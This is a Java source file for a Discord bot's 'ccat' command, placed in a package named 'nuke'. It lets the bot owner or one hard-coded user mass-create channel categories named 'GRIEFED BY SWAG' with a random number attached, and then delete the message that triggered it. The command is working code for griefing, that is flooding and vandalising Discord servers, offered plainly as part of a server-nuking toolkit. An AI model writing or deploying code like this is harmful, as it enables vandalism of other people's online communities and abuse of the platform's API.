package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class CreateCategoryCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("210956619788320768")) {
            return;
        }
        try {
            int input = Integer.parseInt(args.get(0));
            for (int i = 0; i < input; i++) {
                event.getGuild().createCategory("GRIEFED BY SWAG" + (this.getRandom())).queue();
                if (i == input - 1) {
                    event.getMessage().delete().queue();
//                    EmbedBuilder eb = new EmbedBuilder();
//                    eb.setColor(346626);
//                    eb.setDescription(String.format("✅ Successfully created %s categories(s) ✅", args.get(0)));
//                    event.getChannel().sendMessage(eb.build()).queue();
                }
            }
        } catch (NumberFormatException | IndexOutOfBoundsException ex) {
            event.getChannel().sendMessage("Insert an amount of categories to create, dummy! ").queue();
        }

    }
    private int getRandom() {
        Random randy = new Random();
        return randy.nextInt();
    }

    @Override
    public String getHelp() {
        return "Creates the specified amounts of categories\n`" + Core.PREFIX + getInvoke() + " [amount]`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "ccat";
    }

    @Override
    public String[] getAlias() {
        return new String[] {"createcategory","createcategory","createtc","createcat"};
    }

     @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}
